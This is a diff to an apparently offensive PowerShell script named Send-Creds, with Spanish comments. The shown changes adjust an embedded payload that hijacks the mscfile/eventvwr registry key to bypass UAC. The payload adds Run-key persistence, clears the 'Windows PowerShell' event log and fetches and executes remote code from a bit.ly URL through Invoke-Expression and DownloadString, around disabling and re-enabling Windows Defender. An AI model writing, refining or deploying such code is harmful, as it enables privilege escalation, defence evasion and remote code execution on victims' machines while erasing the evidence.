@@ -8,7 +8,7 @@
 
 # Funciona con Powershell 2+ o sea desde win7+
 
-Function Send-Creds {
+#Function Send-Creds {
 	Param (
 		$From,
 		$Password,
@@ -39,7 +39,7 @@ Function Send-Creds {
 		# Clear EventLog
 		Clear-EventLog -LogName 'Windows PowerShell'
 	"
-	
+
 		### Antimalware service detected
 		$MsMpEngBypass = "
 		# Import module to Enable/Disable WindowsDefender
@@ -50,25 +50,30 @@ Function Send-Creds {
 		`$Path = 'HKCU:\Software\Microsoft\Powershell'
 		`$mscCommandPath = 'HKCU:\Software\Classes\mscfile\shell\open\command'
 		`$RunPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-
-		`$Command = '
-		$Command
+            
+            
+		`$Command = `"
+        # Wait until windows load
+        Start-Sleep 60
+		" + $Command.Replace('$','`$') + "
 		## Clean Up ##
-		Remove-ItemProperty -Path `$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
-		Remove-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
-		Remove-ItemProperty -Path `$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path ```$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path ```$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path ```$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
 
 		# Import module to Enable/Disable WindowsDefender
 		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
 		# Enable WindowsDefender
 		Set-WindowsDefender -Mode Enabled
-		'
+		`"
+        
 
 		# Save command in the register
 		Remove-ItemProperty -Path `$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
 		New-ItemProperty -Path `$Path -Name 'Command' -Value `$Command -PropertyType string -Force | Out-Null
 
 		# Save launcher of the command
+        New-Item `$mscCommandPath -Force -ErrorAction Continue | Out-Null
 		Remove-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
 		New-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Value 'Powershell Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -PropertyType string -Force | Out-Null
 
@@ -101,4 +106,5 @@ Function Send-Creds {
 		# Remove command from the register
 		Remove-ItemProperty -Path $Path -Name 'Command' -Force
 	}
-}
+#}
+
